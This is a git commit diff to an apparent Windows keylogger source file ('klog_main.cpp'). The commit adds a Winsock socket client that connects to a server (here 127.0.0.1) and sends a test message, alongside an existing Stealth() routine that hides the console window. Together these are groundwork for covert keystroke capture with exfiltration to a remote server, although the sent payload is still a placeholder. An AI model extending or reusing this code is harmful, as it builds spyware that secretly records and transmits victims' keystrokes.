a45e0ad7c4bb012597862ff56e21c18f75a7f7f8
YuXiang <richardlin0212@gmail.com>
2020-05-07 17:18:21 +0800

    Add socket
    Server receive message from Client

--- windows/klog_main.cpp
+++ windows/klog_main.cpp
@@ -1,10 +1,11 @@
+#pragma comment(lib, "Ws2_32.lib")
 #include <Windows.h>
 #include <time.h>
 
 #include <cstdio>
 #include <fstream>
 #include <iostream>
-
+#include <string>
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
 #define visible  // (visible / invisible)
@@ -168,6 +169,66 @@ void Stealth()
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);  // invisible window
 #endif                                                       // invisible
 }
+
+int SendMessage()
+{
+    string confirm;
+    char message[200];
+
+    //開始 Winsock-DLL
+    int r;
+    WSAData wsaData;
+    WORD DLLVersion;
+    DLLVersion = MAKEWORD(2, 1);
+    r = WSAStartup(DLLVersion, &wsaData);
+
+    //宣告給 socket 使用的 sockadder_in 結構
+    SOCKADDR_IN addr;
+
+    int addlen = sizeof(addr);
+
+    //設定 socket
+    SOCKET sConnect;
+
+    // AF_INET: internet-family
+    // SOCKET_STREAM: connection-oriented socket
+    sConnect = socket(AF_INET, SOCK_STREAM, NULL);
+
+    //設定 addr 資料
+    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(PORT_NUM);
+
+    cout << "connect to server?[Y] or [N]" << endl;
+    cin >> confirm;
+
+    if (confirm == "N") {
+        exit(1);
+    } else {
+        if (confirm == "Y") {
+            connect(sConnect, (SOCKADDR *) &addr, sizeof(addr));
+
+            char *tmp = "hello server";
+            // send to server
+            r = send(sConnect, tmp, (int) strlen(tmp), 0);
+            //接收 server 端的訊息
+            // ZeroMemory(message, 200);
+            // r = recv(sConnect, message, sizeof(message), 0);
+            // cout << message << endl;
+            //設定 closesocket 時，不經過 TIME-WAIT 過程,直接關閉socket
+            // BOOL bDontLinger = FALSE;
+            // setsockopt(sConnect,SOL_SOCKET,SO_DONTLINGER,(const
+            // char*)&bDontLinger,sizeof(BOOL));
+
+            //若之後不再使用，可用 closesocket 關閉連線
+            closesocket(sConnect);
+
+            getchar();
+            getchar();
+        }
+    }
+}
+
 
 int main()
 {
